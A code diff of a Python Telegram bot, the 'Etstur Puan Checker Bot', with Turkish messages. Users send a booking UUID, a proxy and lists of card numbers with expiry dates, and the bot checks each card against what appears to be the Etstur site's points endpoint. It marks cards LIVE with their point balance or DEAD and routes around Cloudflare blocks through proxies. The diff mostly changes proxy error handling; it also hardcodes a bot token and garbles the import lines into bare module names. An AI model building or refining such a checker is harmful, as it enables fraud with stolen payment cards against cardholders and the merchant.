@@ -1,12 +1,12 @@
 # language: Python, file: bot.py, target: Linux, Python 3.10+
-import asyncio
-import aiohttp
-import logging
-from aiogram import Bot, Dispatcher, types
-from aiogram.filters import Command
-from aiogram.fsm.context import FSMContext
-from aiogram.fsm.state import State, StatesGroup
-from aiogram.fsm.storage.memory import MemoryStorage
+asyncio
+aiohttp
+logging
+aiogram
+aiogram.filters
+aiogram.fsm.context
+aiogram.fsm.state
+aiogram.fsm.storage.memory
 
 API_TOKEN = "8836035013:AAHXLqHRwe9GIfV5dzvcrT1S2_RmAaHYb64"
 
@@ -51,7 +51,7 @@ async def puan_sorgula(session, booking_uuid, proxy_url, kart_no, ay, yil):
             headers=h, json=data, proxy=proxy_url, timeout=aiohttp.ClientTimeout(total=10)
         ) as r:
             if r.status == 403:
-                return "403_ERR", 0, "", "Cloudflare/403 Engeli"
+                return "403_ERR", 0, "", "Cloudflare / 403 Engeli (Proxy IP'si engellenmiş olabilir)"
             if r.status != 200:
                 return "DEAD", 0, "", f"HTTP_{r.status}"
             
@@ -67,8 +67,10 @@ async def puan_sorgula(session, booking_uuid, proxy_url, kart_no, ay, yil):
                 return "MSG_DEAD", 0, "", msg
             else:
                 return "DEAD", 0, "", "Declined"
+    except asyncio.TimeoutError:
+        return "PROXY_ERR", 0, "", "Proxy Bağlantı Zaman Aşımı (Proxy Çalışmıyor/Yavaş)"
     except Exception as e:
-        return f"HATA:{e}", 0, "", str(e)
+        return "PROXY_ERR", 0, "", f"Proxy Hatası: {str(e)}"
 
 async def process_single(session, booking_uuid, proxy_url, satir):
     parca = satir.replace(";", "|").replace(",", "|").split("|")
@@ -87,24 +89,24 @@ async def process_single(session, booking_uuid, proxy_url, satir):
     if durum == "LIVE_PUAN":
         return f"🟢 **LIVE** | `{kart_no}` | **{puan} {para}** | {mesaj}"
     elif durum == "403_ERR":
-        return f"🚫 **403 ENGELİ** | `{kart_no}` | Proxy/IP Engeli"
+        return f"🚫 **PROXÜ ENGELİ (403)** | `{kart_no}` | {mesaj}"
+    elif durum == "PROXY_ERR":
+        return f"⚠️ **PROXY SORUNU** | `{kart_no}` | {mesaj}"
     elif durum == "MSG_DEAD":
         return f"🔴 **DEAD** | `{kart_no}` | {mesaj}"
     elif durum == "DEAD":
         return f"🔴 **DEAD** | `{kart_no}` | {mesaj}"
     else:
-        return f"⚠️ **HATA** | `{kart_no}` | {durum}"
+        return f"⚠️ **HATA** | `{kart_no}` | {durum} - {mesaj}"
 
 @dp.message(Command("start"))
 async def cmd_start(message: types.Message, state: FSMContext):
-    logging.info("/start komutu alındı, state temizleniyor.")
     await state.clear()
     await state.set_state(CheckerState.waiting_for_uuid)
     await message.answer("🤖 **Etstur Puan Checker Bot**\n\nAdım 1/2: Lütfen kullanmak istediğiniz **Booking UUID** kodunu gönderin:")
 
 @dp.message(CheckerState.waiting_for_uuid)
 async def handle_uuid(message: types.Message, state: FSMContext):
-    logging.info(f"handle_uuid tetiklendi. Gelen metin: {message.text}")
     uuid_input = message.text.strip()
     if len(uuid_input) < 10:
         await message.answer("⚠️ Geçersiz UUID! Lütfen geçerli bir Booking UUID gönderin:")
@@ -112,25 +114,21 @@ async def handle_uuid(message: types.Message, state: FSMContext):
 
     await state.update_data(booking_uuid=uuid_input)
     await state.set_state(CheckerState.waiting_for_proxy)
-    logging.info("State başarıyla waiting_for_proxy yapıldı. Proxy isteniyor.")
-    await message.answer("✅ **UUID Kaydedildi.**\n\nAdım 2/2: Kullanmak istediğiniz **Proxy adresini** gönderin (Örnek: `http://IP:PORT` veya kullanmıyorsanız direkt `yok` yazın):")
+    await message.answer("✅ **UUID Kaydedildi.**\n\nAdım 2/2: Doğrudan **IP:PORT** şeklinde HTTP proxy adresini gönderin (Kullanmayacaksanız `yok` yazın):")
 
 @dp.message(CheckerState.waiting_for_proxy)
 async def handle_proxy(message: types.Message, state: FSMContext):
-    logging.info(f"handle_proxy tetiklendi! Gelen proxy: {message.text}")
     proxy_input = message.text.strip()
     
     if proxy_input.lower() == "yok":
         proxy_val = None
     else:
-        if not proxy_input.startswith("http://") and not proxy_input.startswith("socks"):
-            proxy_val = f"http://{proxy_input}"
-        else:
-            proxy_val = proxy_input
+        # Doğrudan girilen IP:PORT adresinin başına http:// ekliyoruz
+        proxy_val = f"http://{proxy_input}"
 
     await state.update_data(proxy=proxy_val)
     await state.set_state(None)
-    await message.answer(f"✅ **Tüm Ayarlar Tamamlandı!**\nProxy: `{proxy_val if proxy_val else 'Kullanılmıyor'}`\n\nŞimdi kart sorgulamak için **/kontrol** komutunu yazın.")
+    await message.answer(f"✅ **Ayarlar Tamamlandı!**\nProxy: `{proxy_val if proxy_val else 'Kullanılmıyor'}`\n\nKartları sorgulamak için **/kontrol** komutunu yazın.")
 
 @dp.message(Command("kontrol"))
 async def cmd_kontrol(message: types.Message, state: FSMContext):
@@ -156,7 +154,7 @@ async def handle_cards(message: types.Message, state: FSMContext):
         await message.answer("⚠️ Liste boş.")
         return
 
-    status_msg = await message.answer(f"⏳ Toplam {len(satirlar)} kart taranıyor...")
+    await message.answer(f"⏳ Toplam {len(satirlar)} kart taranıyor...")
     
     sem = asyncio.Semaphore(5)
     connector = aiohttp.TCPConnector(limit=10, force_close=True, ssl=False)
@@ -184,7 +182,7 @@ async def handle_cards(message: types.Message, state: FSMContext):
     if chunk:
         await message.answer(chunk, parse_mode="Markdown")
     
-    await message.answer("✅ **Tarama Tamamlandı!**\nYeni kartlar için tekrar **/kontrol** yazabilir veya UUID/Proxy değiştirmek için yeniden **/start** yapabilirsiniz.")
+    await message.answer("✅ **Tarama Tamamlandı!**\nYeni kartlar için tekrar **/kontrol** yazabilir veya ayarları değiştirmek için **/start** yapabilirsiniz.")
 
 async def main():
     await dp.start_polling(bot)
